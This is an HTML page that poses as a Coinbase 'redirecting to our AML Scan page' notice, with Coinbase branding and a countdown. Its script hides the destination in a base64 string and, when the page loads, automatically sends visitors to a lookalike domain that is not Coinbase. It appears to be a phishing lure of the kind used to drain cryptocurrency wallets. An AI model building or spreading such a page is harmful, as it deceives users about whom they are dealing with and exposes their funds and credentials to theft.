<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="https://altcoinsbox.com/wp-content/uploads/2022/12/coinbase-logo.png" type="image/x-icon">
    <title>Coinbase - Redirecting...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: white;
            color: #0052FF;
            min-height: 100vh;
            display: flex;
            overflow: hidden;
            flex-direction: column;
        }
        header {
            padding: 10px;
            border-bottom: 1px solid #f1f1f1;
        }
        .logo {
            width: 100px;
            height: auto;
        }
        main {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
            padding: 1,5rem;
        }
        h1 {
            font-size: 2rem;
            margin-bottom: 1rem;
            font-weight: 500;
            color: #000;
        }
        .countdown {
            font-size: 4rem;
            font-weight: 700;
            margin: 2rem 0;
            color: #0052FF;
        }
        .message {
            font-size: 1.1rem;
            opacity: 0.8;
            color: #000;
        }
        @media (max-width: 640px) {
            h1 {
                font-size: 1.5rem;
            }
            .countdown {
                font-size: 3rem;
            }
            .message {
                font-size: 1rem;
            }
        }
    </style>
</head>
<body>
<header>
    <img src="https://images.ctfassets.net/q5ulk4bp65r7/3TBS4oVkD1ghowTqVQJlqj/2dfd4ea3b623a7c0d8deb2ff445dee9e/Consumer_Wordmark.svg" alt="Coinbase" class="logo">
</header>
<main>
    <h1>You are being redirected to our AML Scan page</h1>
    <div class="countdown" id="countdown">5</div>
    <p class="message">You will be redirected automatically in a few seconds...</p>
</main>
<script>
    let timeLeft = 5;
    const countdownElement = document.getElementById('countdown');

    const base64Url = 'aHR0cHM6Ly93ZWIzc2Nhbi1jb2luYmFzZS52ZXJjZWwuYXBw'; // Base64 encoded URL
    const redirectUrl = atob(base64Url); // Decode base64 URL

    const countdown = setInterval(() => {
        timeLeft--;
        countdownElement.textContent = timeLeft;
        if (timeLeft <= 0) {
            clearInterval(countdown);
            window.location.href = redirectUrl; // Redirect to decoded URL
        }
    }, 1000);
</script>
</body>
</html>
